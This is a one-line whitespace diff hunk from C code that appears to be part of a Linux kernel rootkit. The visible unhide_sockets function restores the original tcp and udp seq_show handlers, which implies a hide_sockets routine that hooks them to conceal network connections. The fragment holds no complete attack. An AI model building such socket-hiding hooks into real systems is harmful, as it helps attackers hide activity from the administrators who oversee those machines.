@@ -207,7 +207,6 @@ void hide_sockets(void){
 }
 
 
-
 void unhide_sockets(void){
 	*udp_hook_ptr = orig_udp_seq_show;
 	*tcp_hook_ptr = orig_tcp_seq_show;
